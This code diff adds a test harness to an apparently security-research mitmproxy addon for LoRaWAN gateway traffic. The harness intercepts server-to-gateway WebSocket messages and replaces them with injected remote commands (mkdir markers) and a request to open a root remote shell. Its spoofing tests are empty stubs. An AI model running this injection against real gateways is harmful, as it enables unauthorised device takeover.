@@ -2,6 +2,15 @@ import json
 import time
 from mitmproxy import http, ctx
 import os
+from enum import Enum
+
+class Test(Enum):
+    spoofRssi = 'spoofRssi'
+    spoofDevAddr ='spoofDevAddr'
+    spoofDevEUI = 'spoofDevEUI'
+    # https://doc.sm.tc/station/tcproto.html#remote-commands
+    injectRCE= 'injectRCE'
+
 
 class LNSInterceptor:
     root = '/home/mitmproxy'
@@ -92,37 +101,6 @@ class LNSInterceptor:
             self.append_to_file(self.wss_messages_file, message_info)
 
             ctx.log.info(f"[{timestamp}] Logged WebSocket message from {'client' if message.from_client else 'server'}")
-            
-            # !! this section should be removed after test
-
-            # !! test0 -> https://doc.sm.tc/station/tcproto.html#remote-commands
-            """  
-           if message.from_client == False:
-               
-                message.drop()
-                #run_cmd = {"msgtype": "runcmd", "command": "mkdir /tmp/RCE_SUCCESS", "arguments": []}
-                run_cmd= {"msgtype": "runcmd", "command": "mkdir", "arguments": ["/tmp/RCE_SUCCESS_2"]}
-                rmt_sh = {
-                    "msgtype": "rmtsh",
-                    "user": "root",
-                    "term": "xterm-256color",
-                    "start":1,
-                    #"stop":0
-                }
-
-                command_bytes = json.dumps(run_cmd).encode('utf-8')
-                
-                # hope this works
-
-                message.content = command_bytes
-                
-
-                # Replace the content with the new command
-                ctx.log.info(f"[{timestamp}] Try to run command on dragino")
-            else:
-                ctx.log.info("Command abort as it comes from client") 
-            """
-
 
     # on obj destruct kill the filestream
     def __del__(self):
@@ -169,5 +147,99 @@ class CUPSInterceptor:
         except Exception as e:
             ctx.log.info(f"[{timestamp}] Error processing HTTP response: {e}")
 
+
+class TestSamples:
+    def __init__(self)-> None:
+        ctx.log.info(f"init Test Samples")
+
+        # the dev address from our device
+        self.own_dev_address = 00000
+        # the selected test to run
+        self.selected_test = Test.injectRCE
+        # index used to move through the rce commands array
+        self.rce_index = 0
+        # commands to test for the Test.injectRCE
+        self.rce_commands  = [
+                        {"msgtype": "runcmd", "command": "mkdir", "arguments": ["/tmp/RCE_SUCCESS_0"]},
+                        {"msgtype": "runcmd", "command": "mkdir /tmp/RCE_SUCCESS_1", "arguments": []},
+                        # root@dragino-22af58:~# which mkdir
+                        {"msgtype": "runcmd", "command": "/bin/mkdir", "arguments": ['/tmp/RCE_SUCCESS_2']},
+                        {"msgtype": "runcmd", "command": "/bin/mkdir /tmp/RCE_SUCCESS_3", "arguments": ['']},
+                        
+                        # "stop":0  omitted based on doc if want to start a remote shell
+                        {"msgtype": "rmtsh","user": "root","term": "xterm-256color","start":1}
+                    ]
+        # test that should be run
+        self.test_functions = {
+            Test.spoofRssi: self.spoof_rssi,
+            Test.spoofDevEUI: self.spoof_dev_eui,
+            Test.spoofDevAddr: self.spoof_dev_addr,
+            Test.injectRCE: self.inject_rce
+        }
+        
+    def get_property(data, property_path):
+        #split all keys based on expected path
+        keys = property_path.split('.')
+        current_data = data
+        
+        for key in keys:
+            # case of iterate over []
+            if isinstance(current_data, list):
+                key = int(key)
+            current_data = current_data[key]
+        return current_data
+
+    def set_property(data, property_path, new_value):
+        keys = property_path.split('.')
+        current_data = data
+        for key in keys[:-1]:
+            # case of iterate over []
+            if isinstance(current_data, list):
+                key = int(key)
+            current_data = current_data[key]
+        final_key = keys[-1]
+        if isinstance(current_data, list):
+            final_key = int(final_key)
+        current_data[final_key] = new_value
+    
+
+    def timestamp_now(self):
+        return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
+    
+    def websocket_message(self, flow: http.HTTPFlow):
+        if flow.websocket is not None:
+            if self.selected_test in self.test_functions:
+                self.test_functions[self.selected_test](flow)
+            else:
+                ctx.log.info(f"No test function found for {self.selected_test.value}")
+
+    def spoof_rssi(self, flow: http.HTTPFlow):
+        ctx.log.info(f"Executing {self.selected_test.value} test")
+        # todo
+
+    def spoof_dev_eui(self, flow: http.HTTPFlow):
+        ctx.log.info(f"Executing {self.selected_test.value} test")
+        # todo
+
+    def spoof_dev_addr(self, flow: http.HTTPFlow):
+        ctx.log.info(f"Executing {self.selected_test.value} test")
+        # todo
+
+    def inject_rce(self, flow: http.HTTPFlow):
+        timestamp = self.timestamp_now()
+        message = flow.websocket.messages[-1]
+        if not message.from_client:
+            message.drop()
+            ctx.log.info(f"[{timestamp}] Test run: {self.selected_test.value}, RCE command index: {self.rce_index}")
+            command_bytes = json.dumps(self.rce_commands[self.rce_index]).encode('utf-8')
+
+            self.rce_index += 1
+
+            if self.rce_index >= len(self.rce_commands):
+                self.rce_index = 0
+
+            message.content = command_bytes
+                    
+
 # add the current logger as new addon on mitmproxy
-addons = [LNSInterceptor(), CUPSInterceptor()]
+addons = [LNSInterceptor(), CUPSInterceptor(), TestSamples()]
